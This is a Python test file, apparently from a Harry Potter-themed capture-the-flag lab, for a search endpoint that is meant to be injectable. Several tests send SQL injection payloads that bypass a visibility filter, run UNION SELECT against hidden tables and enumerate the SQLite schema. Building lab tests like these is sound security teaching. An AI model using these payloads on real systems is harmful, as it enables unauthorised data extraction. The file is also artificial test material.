def post_accio(client, query):
    resp = client.post("/api/accio", json={"query": query})
    return resp, resp.get_json()


def test_normal_search_finds_a_visible_character(web_client):
    resp, data = post_accio(web_client, "Harry")
    assert resp.status_code == 200
    assert data["success"] is True
    assert any(r["name"] == "Harry Potter" for r in data["results"])


def test_hermione_absent_from_normal_search(web_client):
    resp, data = post_accio(web_client, "Hermione")
    assert data["success"] is False
    assert "results" not in data or not data.get("results")


def test_hermione_absent_even_with_exact_name(web_client):
    resp, data = post_accio(web_client, "Hermione Granger")
    assert data["success"] is False


def test_visibility_filter_bypass_reveals_hermione(web_client):
    payload = "zzzzzzzz' OR visible=0 -- "
    resp, data = post_accio(web_client, payload)
    assert data["success"] is True
    names = [r["name"] for r in data["results"]]
    assert "Hermione Granger" in names
    assert data.get("revealed_hidden") is True


def test_union_extracts_map_services(web_client):
    payload = "zzzzzzzz' UNION SELECT hostname, note FROM map_services -- "
    resp, data = post_accio(web_client, payload)
    assert data["success"] is True
    names = [r["name"] for r in data["results"]]
    assert "map-internal" in names


def test_union_extracts_map_services_port(web_client):
    payload = "zzzzzzzz' UNION SELECT hostname, CAST(port AS TEXT) FROM map_services -- "
    resp, data = post_accio(web_client, payload)
    notes = [r["note"] for r in data["results"]]
    assert "5001" in notes


def test_union_extracts_map_notes_archive_phrase(web_client):
    payload = "zzzzzzzz' UNION SELECT 'note', content FROM map_notes -- "
    resp, data = post_accio(web_client, payload)
    assert data["success"] is True
    joined = " ".join(r["note"] for r in data["results"])
    assert "mischief managed" in joined.lower()


def test_schema_enumeration_reveals_target_tables(web_client):
    payload = "zzzzzzzz' UNION SELECT name, type FROM sqlite_master WHERE type='table' -- "
    resp, data = post_accio(web_client, payload)
    assert data["success"] is True
    table_names = [r["name"] for r in data["results"]]
    assert "map_services" in table_names
    assert "map_notes" in table_names


def test_empty_query_rejected_with_message(web_client):
    resp, data = post_accio(web_client, "")
    assert resp.status_code == 400
    assert data["success"] is False
    assert data["message"]


def test_no_results_has_marauder_voiced_message(web_client):
    resp, data = post_accio(web_client, "Definitely Nobody Real")
    assert data["success"] is False
    assert data["message"]


def test_malformed_query_type_rejected(web_client):
    resp = web_client.post("/api/accio", json={"query": 12345})
    data = resp.get_json()
    assert resp.status_code == 400
    assert data["success"] is False


def test_malformed_json_does_not_crash(web_client):
    resp = web_client.post("/api/accio", data="not json", content_type="application/json")
    assert resp.status_code == 400
    data = resp.get_json()
    assert data["success"] is False
